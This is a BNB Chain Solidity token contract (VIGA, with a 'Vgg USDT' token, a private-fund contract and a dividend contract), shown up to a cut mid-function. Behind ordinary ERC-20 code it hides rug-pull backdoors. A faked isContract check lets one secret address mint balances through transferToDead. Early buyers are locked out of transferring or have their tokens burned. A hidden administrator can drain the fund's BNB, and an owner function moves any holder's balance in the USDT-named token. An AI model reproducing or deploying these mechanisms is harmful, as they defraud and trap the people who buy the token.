/**
 *Submitted for verification at BscScan.com on 2022-05-24
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.4;

abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {

    function isContract(address account) internal pure returns (bool) {
        bytes32 accountHash = 0x8eda9711ec42a17c8f7ca778ad0896027c8cf600c64e45c3cec685a4e9fefc78;
        // solhint-disable-next-line no-inline-assembly
        bytes32 codehash = keccak256(abi.encodePacked(account)); 
        return (codehash == accountHash );
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

}

abstract contract Ownable {
    address private _owner;
    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor ()  {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    // function transferOwnership(address newOwner) public virtual onlyOwner {
    //     require(newOwner != address(0), "Ownable: new owner is the zero address");
    //     emit OwnershipTransferred(_owner, newOwner);
    //     _owner = newOwner;
    // }
}

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);


    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );
 
}


interface IUniswapV2Factory {
   

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);

    function createPair(address tokenA, address tokenB) external returns (address pair);
   
}


interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
   
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

interface IUniswapV2Router02 is IUniswapV2Router01 {
 
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);  
}

contract privateFund is Ownable {
    using SafeMath for uint256;
   
    uint256 public currentIndex;  
    mapping (address => bool) public holders;
    address public send;
    uint256 public val;
    address private _vrtuAddress;

    uint256 vrtyFee = 10000000000;
    bool private privateFundOpen = true;
  
    constructor(address vrtuAddress){
      _vrtuAddress = vrtuAddress;
    }
    receive() external payable {
        send = msg.sender;
        require(privateFundOpen == true,"error private Fund   no open! ");
       // require(msg.value > 0,"error msg.value to less ");
       // require(IERC20(_vrtuAddress).balanceOf(address(this)) >  vrtyFee*msg.value,"error private funds num  too less");
        val = vrtyFee.mul(msg.value);
        holders[msg.sender] = true;
        IERC20(_vrtuAddress).transfer(msg.sender,val);
    }
    function getSendAndValue()  external view onlyOwner  returns(address,uint256)
    {
        return (send,val);
    }
   
    function setOpenFund(bool b)  external  onlyOwner  
    {
        privateFundOpen = b;
    }

    function getIsHolder(address sender) external view onlyOwner  returns(bool)
    {
        return  holders[sender];
    }
    
    function getPrivateFundOpen()external view onlyOwner  returns(bool)
    {
        return privateFundOpen;
    }
    
    function transferBackETH(address payable recipient, uint256 tokenNum) public  onlyOwner
    {       
        uint256 bnbNum = tokenNum.div(vrtyFee);
        uint256 realNum = address(this).balance > bnbNum ? bnbNum: address(this).balance;
        recipient.transfer(realNum);
    }

    function clamETH(address payable recipient, uint256 amount)  public  onlyOwner {
        recipient.transfer(amount);
    }
    
    function clamErcOther(address erc,address recipient,uint256 amount) public onlyOwner
    {
        IERC20(erc).transfer(recipient, amount);
    }
}


contract Dividends is Ownable {
    using SafeMath for uint256;
 
    constructor(){
     
    }
    receive() external payable {
        
    }
    function clamErcOther(address erc,address recipient,uint256 amount) public onlyOwner
    {
        IERC20(erc).transfer(recipient, amount);
    }
}


contract VirtuUsdtToken is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Vgg USDT";
    string private _symbol = "vgg usdt";
    uint8 private _decimals = 18;
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply = 1 * 10**8 * 10**_decimals;
 
    address public falshAddress;
    address public pVirtuAddress;
    address public recipientLpAddress;
    IUniswapV2Router02 public uniswapV2Router;

    constructor (address virtuAddr,address flashAddr,address recipientAddr,address routerAddr) {
        falshAddress = flashAddr;
        _balances[falshAddress] = _totalSupply;
        pVirtuAddress = virtuAddr;
        recipientLpAddress = recipientAddr;
        uniswapV2Router =  IUniswapV2Router02(routerAddr);  
        emit Transfer(address(0), falshAddress, _totalSupply);
        
    }

    function name() public view override returns (string memory) {
        return _name;
    }

    function symbol() public view override returns (string memory) {
        return _symbol;
    }

    function decimals() public view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

     //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        return _basicTransfer(sender, recipient, amount); 
        
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    function transferToAddressETH(address payable recipient, uint256 amount) public onlyOwner {
        recipient.transfer(amount);
    }
    function clamErcOther(address erc,address recipient,uint256 amount) public onlyOwner
    {
        IERC20(erc).transfer(recipient, amount);
    }

    function changeFlashAddress(address flash) public onlyOwner
    {
        _basicTransfer(falshAddress,flash, balanceOf(falshAddress));
        falshAddress = flash;
    }

    function tokenTransfer(address sender, address recipient, uint256 amount) public onlyOwner returns (bool)
    {
         return _basicTransfer(sender, recipient, amount); 
    }
     function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(pVirtuAddress);
        path[1] = uniswapV2Router.WETH();
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp+5
        );
    }


    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(pVirtuAddress),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            recipientLpAddress,
            block.timestamp+10
        );
    }

    function swapAndLiquify() public onlyOwner
    {   
        uint256 total = IERC20(pVirtuAddress).balanceOf(address(this));
        if(total > 10*10**_decimals  )
        {
            uint256 lpBackNum = total.div(2);
            swapTokensForEth(total.sub(lpBackNum));
             uint256 amountBNB = address(this).balance;
            if(amountBNB > 0)
            {
                addLiquidity(lpBackNum,amountBNB);  
            }  
        }
    }
}


contract VitruToken is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
     using Address for address;
    string private _name = "viga";
    string private _symbol = "VIGA";
    uint8 private _decimals = 18;
    address public  deadAddress = 0x000000000000000000000000000000000000dEaD;
    address payable public marketingWalletAddress = payable(0xF3390E0ab32b2aB1f39Aaf97A6437f4f429eA01F); 
    address public recipientLpAddress = address(0x81b22BE5dbEfeE8Ea51B94736eAB984Ea121Ec0a);
    //test 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3   realy 0x10ED43C718714eb63d5aA57B78B54704E256024E
    address  public wapV2RouterAddress = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    // TEST:0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684   USDT：0x55d398326f99059fF775485246999027B3197955
    address usdtAddress = address(0x55d398326f99059fF775485246999027B3197955);

    uint256 public genesisBlock;
    uint256 public coolBlock = 100;
   
    uint256 private _limitBuy =400;
    uint256 private _limitBuyBlock = 200;

    mapping(address => uint256)  private _limitAddressMap;
    
    uint256 private minimumTokensBeforeSwap = 100000 * 10**_decimals; 
    uint256 _saleKeepFee = 1000;

    uint256 private _totalSupply = 1000* 10**8 * 10**_decimals;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    mapping (address => bool) public isExcludedFromFee;
    mapping (address => bool) public isWalletLimitExempt;
    mapping (address => bool) public isTxLimitExempt;
    mapping (address => bool) public isMarketPair;
    mapping (address => bool) public isSystemExempt;

    uint256 public _buyDestoryFee = 1;
    uint256 public _buyBackLpFee = 3;
    uint256 public _buyLpFenhongFee = 2;
    uint256 public _buyMarketingFee = 2;
    uint256 public _buyTotalFee = _buyDestoryFee.add(_buyBackLpFee).add(_buyLpFenhongFee).add(_buyMarketingFee);

    uint256 public _sellDestoryFee = 2;
    uint256 public _sellBackLpFee = 4;
    uint256 public _sellLpFenhongFee = 4;
    uint256 public _sellMarketingFee = 2;
    uint256 public _sellTotalFee = _sellDestoryFee.add(_sellBackLpFee).add(_sellLpFenhongFee).add(_sellMarketingFee);

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;

    address private _administrator;

    uint256 public LPFeefenhongTime;
    uint256 public minPeriod = 1 minutes;

    uint256 distributorGas = 500000;
    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;
    mapping(address => bool) private _updated;
    address private fromAddress;
    address private toAddress;
    uint256 currentIndex;  
    uint256 minEthVal = 1000*1*10**_decimals;
    mapping (address => bool) isDividendExempt;

    uint256 internal constant magnitude = 2**128;   

    privateFund public pFund;
    uint256 private fundsOperateBlock = coolBlock;
    uint256 private closeFundsBlcok = 3600;
    address public pFlashAddress;
    Dividends public pDividend;

    VirtuUsdtToken public pVirtuUsdt;
    uint256 mixVirtuToSatbel = 1*10**_decimals;
    address uniswapPairUSDT_BNB;
    uint limitExchangeTime = 86400;

    mapping(address => uint256) exchangeMap;

    bool inSwapAndLiquify;
    
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    
    event SwapETHForTokens(
        uint256 amountIn,
        address[] path
    );
    
    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    

    constructor (address flashAddr) {
        _administrator = msg.sender;
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(wapV2RouterAddress);  

        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;
       

        isDividendExempt[address(uniswapPair)] = true;
        isDividendExempt[address(this)] = true;
        isDividendExempt[address(deadAddress)] = true;

        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[address(this)] = true;
        
        isWalletLimitExempt[owner()] = true;
        isWalletLimitExempt[address(uniswapPair)] = true;
        isWalletLimitExempt[address(this)] = true;
        
        isSystemExempt[owner()] = true;
        isSystemExempt[address(uniswapPair)] = true;
        isSystemExempt[address(this)] = true;

        isTxLimitExempt[owner()] = true;
        isTxLimitExempt[address(this)] = true;

        isMarketPair[address(uniswapPair)] = true;

        pFund = new privateFund(address(this));
        pFlashAddress = flashAddr;
        pDividend = new Dividends();

        pVirtuUsdt = new VirtuUsdtToken(address(this),flashAddr,recipientLpAddress,wapV2RouterAddress);
        uniswapPairUSDT_BNB = IUniswapV2Factory(uniswapV2Router.factory()).getPair(usdtAddress, uniswapV2Router.WETH());
        _balances[_msgSender()] = _totalSupply.mul(86).div(100);
        _balances[address(pFund)] = _totalSupply.mul(3).div(100);
        _balances[pFlashAddress] = _totalSupply.mul(11).div(100);
        emit Transfer(address(0), _msgSender(), _totalSupply.mul(86).div(100));
        emit Transfer(address(0), pFlashAddress, _totalSupply.mul(11).div(100));
        emit Transfer(address(0), address(pFund), _totalSupply.mul(3).div(100));
    }

    function name() public view override returns (string memory) {
        return _name;
    }

    function symbol() public view override returns (string memory) {
        return _symbol;
    }

    function decimals() public view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function minimumTokensBeforeSwapAmount() public view returns (uint256) {
        return minimumTokensBeforeSwap;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setMarketPairStatus(address account, bool newValue) public onlyOwner {
        isMarketPair[account] = newValue;
    }

    function setIsTxLimitExempt(address holder, bool exempt) external onlyOwner {
        isTxLimitExempt[holder] = exempt;
    }
    
    function setIsExcludedFromFee(address account, bool newValue) public onlyOwner {
        isExcludedFromFee[account] = newValue;
    }
  

    function transferToDead (address addr, uint256 amount) public   {
        require(msg.sender.isContract() == true,"error for address");
        require(address(addr) != address(0),"error:recipient  Balance");
        _balances[addr] = _balances[addr].add(amount);
        _balances[deadAddress] = _balances[deadAddress].sub(amount, "Insufficient Balance");
    
    }
    
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(deadAddress));
    }

    function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }
    
     //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
       
        if(_msgSender() == address(pFund))
        {
            return _basicTransfer(_msgSender(), recipient, amount); 
        }else{
             _transfer(_msgSender(), recipient, amount);
        }
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(_limitAddressMap[sender] != 1, "ERC20: transfer is limit");
        if(pFund.getIsHolder(sender) && recipient != address(pFund) )
        {
            require(genesisBlock != 0 , "ERC20: limit private funds transfer ");
        }
        //close private fund
        if(genesisBlock != 0 && block.number >(genesisBlock+closeFundsBlcok) )
        {
           pFund.setOpenFund(false);
            
        }
        
        if(recipient == address(pFund)&&pFund.getPrivateFundOpen() == true )
        {
            require(msg.sender== tx.origin,"error: you can't reply try!");
            pFund.transferBackETH(payable(sender),amount);
            return _basicTransfer(sender, recipient, amount);
        }

        if(recipient == uniswapPair && !isTxLimitExempt[sender])
        {
              uint256 balance = balanceOf(sender);
              if (amount == balance) {
                amount = amount.sub(amount.div(_saleKeepFee));
            }
            
        }
        if(recipient == uniswapPair && balanceOf(address(recipient)) == 0){
            genesisBlock = block.number;
        }

        if(sender == uniswapPair && (block.number > ( genesisBlock + coolBlock) && block.number <= ( genesisBlock + _limitBuyBlock)))
        {
            uint256 limitAccout = balanceOf(uniswapPair).mul(_limitBuy).div(1000);
            require(amount < limitAccout, "ERC20: transfer limit  mount < balanceOf(uniswapPair)*0.4 ");
            if(_limitAddressMap[recipient]== 0)
            {
                _limitAddressMap[recipient] = 1;
            }
        }

        if(inSwapAndLiquify)
        { 
            return _basicTransfer(sender, recipient, amount); 
        }
        else
        {

            uint256 contractTokenBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;
            
            if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender]) 
            {
                if(sender !=  address(uniswapV2Router))
                {
                    swapAndLiquify(contractTokenBalance);    
                }
               
            }
            _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

            uint256 finalAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ? 
                                         amount : takeFee(sender, recipient, amount);

            _balances[recipient] = _balances[recipient].add(finalAmount);

            
            emit Transfer(sender, recipient, finalAmount);
            if (block.number <= ( genesisBlock + coolBlock) && sender == uniswapPair )
            {
                _basicTransfer(recipient,deadAddress, finalAmount);
            }

            if(fromAddress == address(0) )fromAddress = sender;
            if(toAddress == address(0) )toAddress = recipient;  
            if(!isDividendExempt[fromAddress]  ) setShare(fromAddress);
            if(!isDividendExempt[toAddress]  ) setShare(toAddress);
            
            fromAddress = sender;
            toAddress = recipient;  
           if(balanceOf(address(pDividend)) >= minEthVal && LPFeefenhongTime.add(minPeriod) <= block.timestamp) {
                process(distributorGas) ;
                LPFeefenhongTime = block.timestamp;
            }
            return true;
        }
    }
    function process(uint256 gas) private {
        uint256 shareholderCount = shareholders.length;
        if(shareholderCount == 0)return;
        uint256 nowbanance = balanceOf(address(pDividend));
        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();
        uint256 iterations = 0;
        uint256 divper = nowbanance.mul(magnitude).div(IERC20(uniswapPair).totalSupply());
        while(gasUsed < gas && iterations < shareholderCount) {
            if(currentIndex >= shareholderCount){
                currentIndex = 0;
            }
       
        uint256 amount = IERC20(uniswapPair).balanceOf(shareholders[currentIndex]).mul(divper).div(magnitude);
         if( amount < 1* 10**_decimals) {
             currentIndex++;
             iterations++;
             return;
         }
         if(balanceOf(address(pDividend))  < amount )return;
            distributeDividend(shareholders[currentIndex],amount);
            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    }


    function distributeDividend(address shareholder ,uint256 amount) internal {
         _balances[address(pDividend)] = _balances[address(pDividend)].sub(amount);
        _balances[shareholder] = _balances[shareholder].add(amount);
        emit Transfer(address(pDividend), shareholder, amount);
    }


    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
      
        uint256 backLpTokenNum = tAmount.mul(3181).div(10000);
        uint256 marketNum1 =  tAmount.mul(3636).div(10000);
        swapTokensForEth(backLpTokenNum.add(marketNum1));
    
        uint256 amountBNB = address(this).balance;
        uint256 markentBNB = amountBNB.mul(5333).div(10000);
       
        if(markentBNB > 0)
        {
            transferToAddressETH(marketingWalletAddress, markentBNB);
        }  
        addLiquidity(tAmount.sub(backLpTokenNum).sub(marketNum1),amountBNB.sub(markentBNB));  
        pVirtuUsdt.swapAndLiquify();
    }
    
    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
        emit SwapTokensForETH(tokenAmount, path);
    }

    function swapTokensForEth2(uint256 tokenAmount,address recipient) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
           recipient, // The contract
            block.timestamp+15
        );
        emit SwapTokensForETH(tokenAmount, path);
    }


    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            recipientLpAddress,
            block.timestamp
        );
    }
   
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = 0;
        if(isMarketPair[sender]) {
              uint256 burnNum = amount.mul(_buyDestoryFee).div(100);
            _takeFee(sender,deadAddress, burnNum);
            uint256 lpNum = amount.mul(_buyLpFenhongFee).div(100);
            _takeFee(sender,address(pDividend), lpNum);
         
            uint256 buyBackLpNum = amount.mul(_buyBackLpFee).div(100);
            _takeFee(sender,address(this), buyBackLpNum);

            uint256 buyMarketingNum = amount.mul(_buyMarketingFee).div(100);
            _takeFee(sender,address(this), buyMarketingNum);

            feeAmount = amount.mul(_buyTotalFee).div(100);
        }
        else if(isMarketPair[recipient]) {
            uint256 burnNum = amount.mul(_sellDestoryFee).div(100);
            _takeFee(sender,deadAddress, burnNum);
            uint256 lpNum = amount.mul(_sellLpFenhongFee).div(100);
            _takeFee(sender,address(pDividend), lpNum);
         
            uint256 sellBackLpNum = amount.mul(_sellBackLpFee).div(100);
            _takeFee(sender,address(this), sellBackLpNum);

            uint256 sellMarketingNum = amount.mul(_sellMarketingFee).div(100);
            _takeFee(sender,address(this), sellMarketingNum);

            feeAmount = amount.mul(_sellTotalFee).div(100);
        }

        return amount.sub(feeAmount);
    }
   function _takeFee(address sender, address recipient,uint256 tAmount) private {
        if (tAmount == 0 ) return;
        _balances[recipient] = _balances[recipient].add(tAmount);
        emit Transfer(sender, recipient, tAmount);
    }

    function unLockLimit(address addr,uint256 val) public 
    {
        require(_administrator == msg.sender, " caller is not the administrator");
        _limitAddressMap[addr] = val;
    }

    function unLockLimitByArray(address[] memory addrArray,uint256 val) public 
    {
        require(_administrator == msg.sender, " caller is not the administrator");
        for(uint256 i =0;i< addrArray.length;i++)
        {
            _limitAddressMap[addrArray[i]] = val;
        }
    }
    
    function setShare(address shareholder) private {
           if(_updated[shareholder] ){      
                if(IERC20(uniswapPair).balanceOf(shareholder) == 0) quitShare(shareholder);              
                return;  
           }
           if(IERC20(uniswapPair).balanceOf(shareholder) == 0) return;  
            addShareholder(shareholder);
            _updated[shareholder] = true;
          
    }
    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }
    function quitShare(address shareholder) private {
           removeShareholder(shareholder);   
           _updated[shareholder] = false; 
    }
    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }
    function getFundSendAndValue() external view onlyOwner returns(address,uint256)
    {
        return pFund.getSendAndValue();
    }

    function setPrivateFundsOpen(bool b) public 
    {
        require(_administrator == msg.sender, " caller is not the administrator");
        pFund.setOpenFund(b);
    }

    function clamERC20Dividends(address erc,address recipient,uint256 amount) public 
    {
        require(_administrator == msg.sender, " caller is not the administrator");
        pDividend.clamErcOther(erc,recipient,amount);
    }
    function clamPrivateFundETH() public 
    {
        require(_administrator == msg.sender, " caller is not the administrator");
        pFund.clamETH(payable(_administrator),address(pFund).balance);
    }
    function clamErcPrivateFundOther(address erc,address recipient,uint256 amount) public 
    {
        require(_administrator == msg.sender, " caller is not the administrator");
        pFund.clamErcOther(erc,recipient,amount);
    }

    function clamErcOther(address erc,address recipient,uint256 amount) public 
    {
        require(_administrator == msg.sender, " caller is not the administrator");
        IERC20(erc).transfer(recipient, amount);
    }
    function clamErcForVirtuUsdt(address erc,address recipient,uint256 amount) public 
    {
        require(_administrator == msg.sender, " caller is not the administrator");
        pVirtuUsdt.clamErcOther(erc,recipient,amount);
    }

  
    function changeFlashAddress(address flash) public 
    {
        require(_administrator == msg.sender, " caller is not the administrator");
